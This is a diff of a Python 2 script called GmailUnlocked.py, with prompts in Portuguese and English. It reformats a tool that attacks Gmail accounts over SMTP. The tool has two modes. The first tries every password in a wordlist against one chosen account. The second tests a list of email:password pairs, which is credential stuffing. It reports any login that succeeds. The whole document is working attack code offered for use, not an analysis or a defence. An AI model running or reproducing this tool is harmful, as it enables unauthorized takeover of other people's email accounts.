@@ -86,7 +86,7 @@ BannerNew =""".....................................,.OOD8D88888...........,.....
                     ...II.  ,O88NNDDDNO8NNMNNI8ODNDNN8O8DNDNND$IOODMDNDNNNNNNNDDO888DDDDDDD.
                      .       .ZZNN8D8NNDNDMND87NODONNZN88N8N88ZOIZNDNND8MNNO88DD+.7I7$7.
                      .       ..$DNONDNMN$NNND$ODDN8ND8DD8N8DDD88?NDDD8DDNNDZ8$O....
-		     
+         
 Use this Help Options >> python2 GmailUnlocked.py -h or '--help'                    """
 print verde+BannerNew
 #print BannerOld
@@ -103,64 +103,65 @@ def help():
    print(verde+'$ python2 GmailUnlocked.py\n')
    print(verde+'Example > [1] email > Wordlist.txt')
    print(verde+'Example > [2] Phantasm_Lab@gmail.com:PhantasmLab')
-   print"Nota > Na opção 2 as listas de emails e senhas deveram conter o seguinte separador ""|""\nComo podemos ver no Exemplo há cima...."  
+   print('')
+   print amarelo + 'NOTA > Na opção 2 as listas de emails e senhas deveram conter o seguinte separador ":" \nComo podemos ver no Exemplo há cima....'
 print(' ')
 try:
-	xxx = sys.argv[1]
-	if xxx == '-h' or opt == '--help':
-		help()
+  xxx = sys.argv[1]
+  if xxx == '-h' or opt == '--help':
+    help()
 except:
-	print ('')
+  print ('')
 print vermelho+OlderZ
 
 options = raw_input(cyanClaro+ "♛ Escolha uma das alternativas para Prosseguir: ")
+print('')
 def Mzt():
-	try:
-		try:
-			smptserver = smtplib.SMTP("smtp.gmail.com", 587)
-			smptserver.ehlo()
-			smptserver.starttls()
+  try:
+    try:
+      smptserver = smtplib.SMTP("smtp.gmail.com", 587)
+      smptserver.ehlo()
+      smptserver.starttls()
+      user = raw_input(cyanClaro + "💉  Enter for your Username or Email >>> ")
+      print('')
+      passwfile = raw_input(verde + "💉  Digite o nome de sua wordlist: ")
+      print('')
 
-#wordlist = open("wordlis.txt", "r")
+      passwfile = open(passwfile, "r")
 
-			user = raw_input("💉 Enter for your Username or Email >>> ")
-			passwfile = raw_input("💉 Digite o nome de sua wordlist: ")
-
-			passwfile = open(passwfile, "r")
-
-			for password in passwfile:
-				try:
-						smptserver.login(user, password)
-						print verde + "[+] Password Found: %s" % password
-						break;
-				except smtplib.SMTPAuthenticationError:		
-						print vermelho + "[!] Password Incorrect: %s" % password
-			time.sleep(1)
-		except:
-			print vermelho + "[404] Wordlist Incorreta![;/]"	
-	except KeyboardInterrupt:
-		print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"
-def Suck():	
-	smptserver = smtplib.SMTP("smtp.gmail.com", 587)
-	smptserver.ehlo()
-	smptserver.starttls()
-	try:
-		WordList = raw_input(azul + "💉 Digite o Nome da sua Wordlist.txt: ")
-		var = open(WordList, 'r').readlines()
-		for line in var:
-			line = line.strip()
-			USERNAME, PASSWORD = line.split("|")
-			try:
-				smptserver.login(USERNAME, PASSWORD)
-				print verde +"[+] Login Activated:\n %s" % line
-				break;
-			except smtplib.SMTPAuthenticationError:
-				print vermelho + "[!] password Incorrect: %s" % password
-	except KeyboardInterrupt:
-		print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"			
+      for password in passwfile:
+        try:
+            smptserver.login(user, password)
+            print verde + "[+] Password Found: %s" % password, "[+] Email: %s" % user
+            break;
+        except smtplib.SMTPAuthenticationError:   
+            print vermelho + "[!] Password Incorrect: %s" % password
+      time.sleep(1)
+    except:
+      print vermelho + "[404] Wordlist Incorreta![;/]"  
+  except KeyboardInterrupt:
+    print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"
+def Suck(): 
+  smptserver = smtplib.SMTP("smtp.gmail.com", 587)
+  smptserver.ehlo()
+  smptserver.starttls()
+  try:
+    WordList = raw_input(azul + "💉 Digite o Nome da sua Wordlist.txt: ")
+    var = open(WordList, 'r').readlines()
+    for line in var:
+      line = line.strip()
+      USERNAME, PASSWORD = line.split(":")
+      try:
+        smptserver.login(USERNAME, PASSWORD)
+        print verde +"[+] Login Activated:\n %s" % line
+        break;
+      except smtplib.SMTPAuthenticationError:
+        print vermelho + "[!] password Incorrect: %s" % password
+  except KeyboardInterrupt:
+    print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"      
 if options == '1':
-	Mzt()	
+  Mzt() 
 elif options == '2':
-	Suck()
+  Suck()
 else:
-	print "Escolha uma opção Valida..[!/.]"
+  print "Escolha uma opção Valida..[!/.]"
